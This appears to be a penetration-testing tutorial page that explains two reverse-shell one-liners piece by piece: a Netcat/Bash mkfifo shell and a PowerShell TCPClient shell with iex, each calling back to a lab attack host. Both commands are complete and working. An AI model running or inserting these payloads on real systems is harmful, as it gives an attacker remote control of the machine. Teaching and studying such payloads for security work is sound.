# Introduction to Payloads

**Netcat/Bash Reverse Shell One-liner**

{% code fullWidth="true" %}
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
{% endcode %}

Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.

Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.

Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).

Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).

Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

**Powershell One-liner**

{% code overflow="wrap" fullWidth="true" %}
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
{% endcode %}

Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in `cmd.exe`.

Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`. The semi-colon (`;`) ensures the commands & code are executed sequentially.

Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications. The semi-colon (`;`) ensures the commands & code are executed sequentially.

Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.

Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (`;`) ensures the commands & code are executed sequentially.

Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard output (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (`;`) ensures the commands & code are executed sequentially.

Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (`;`) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.

Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.
